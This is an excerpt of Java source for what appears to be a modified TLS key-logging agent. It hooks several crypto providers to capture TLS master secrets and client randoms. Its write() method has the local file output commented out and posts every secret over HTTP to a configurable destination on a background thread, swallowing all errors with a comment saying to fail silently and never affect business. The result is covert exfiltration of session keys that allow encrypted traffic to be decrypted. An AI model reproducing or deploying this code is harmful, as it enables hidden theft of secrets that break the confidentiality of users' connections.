...
import name.neykov.secrets.util.HttpPostTest;
...
public class MasterSecretCallback {
    ...
    public static void onMasterSecret(SSLSession sslSession, Key masterSecret) {
        try {
            ...
            write(sessionKey + "," + connectionDetails + "RSA Session-ID:" + sessionKey + " Master-Key:" + masterKey);
        } catch (Exception e) {
    ...
    public static void onCalculateKeys(
        ...
        try {
            ...
            String masterKey = bytesToHex(masterSecret.getEncoded());
            write(clientRandom + "," + connectionDetails + "CLIENT_RANDOM " + clientRandom + " " + masterKey);
        } catch (Exception e) {
            log.log(Level.WARNING, "Error retrieving master secret from " + sslSession, e);
        }
    }
    ...
    public static void onKeyDerivation(Object context, SecretKey key) {
        ...
        try {
            ...
            write(
                    clientRandomBytes + "," + connectionDetails +
    ...
    public static void onBcMasterSecret(Object tlsContext) {
        try {
            ...
            write(
                    clientRandom + "," + getBcConnectionDetails(secParams) +
    ...
    public static void onIbmKeyMaterial(Object generator) {
        try {
            ...
            write(clientRandomHex
                    + ",TLSv1.2_IBM"
                    + "," + "CLIENT_RANDOM " + clientRandomHex + " " + masterKeyHex);
        } catch (Exception e) {
    ...
    private static void write(final String... secrets) throws IOException {
...
//        out.close();
        ...
        EXECUTOR.submit(new Runnable() {
            ...
            public void run() {
                try {
                    for (String secret : secrets) {
                        HttpPostTest.postUrl(secretsFileName, secret);
                    }
                } catch (Throwable e) {
                    // 静默失败，绝对不影响业务
                }
